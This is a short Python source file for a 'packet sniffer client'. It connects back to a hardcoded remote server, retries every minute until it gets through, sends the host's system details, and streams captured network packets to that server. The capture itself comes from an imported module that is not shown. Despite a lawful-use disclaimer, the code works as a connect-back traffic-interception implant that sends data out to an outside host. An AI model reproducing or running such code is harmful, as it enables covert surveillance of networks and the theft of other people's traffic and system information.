#Created by Vasto Boy

#Disclaimer: This packet sniffer should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import json
import time
import socket
import datetime
import platform
import threading
from sniffer import SimpleSniffer


class SimpleSnifferClient:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None



    #tries to connect back to the server
    def establish_connection(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port)) #connect back to server
                print("[+]Connected")
                break
            except socket.error as err:
                print(err)
                time.sleep(60) #try to reconnect after 1 minute



    #returns client system information
    def get_platform_info(self):
        sys_info = {
            "system": platform.uname().system,
            "node": platform.uname().node,
            "release": platform.uname().release,
            "version": platform.uname().version,
            "machine": platform.uname().machine,
            "date_today": str(datetime.date.today()),
            "time_now": str(datetime.datetime.now().time())
        }
        return sys_info



    def send_system_info(self):
        system_info = self.get_platform_info()
        system_info_string = json.dumps(system_info)
        self.sock.send(system_info_string.encode())



    def send_packet_data(self):
        sniffer = SimpleSniffer()

        # Start the packet capture in a separate thread.
        capture_thread = threading.Thread(target=sniffer.main)
        capture_thread.start()

        # Start the file reading in a separate thread.
        read_thread = threading.Thread(target=sniffer.process_captures, args=(self.sock,))
        read_thread.start()


        capture_thread.join()
        read_thread.join()
        


    def start(self):
        self.establish_connection()
        self.send_system_info()
        self.send_packet_data()




sniffer = SimpleSnifferClient("192.168.1.182", 5001)
sniffer.start()




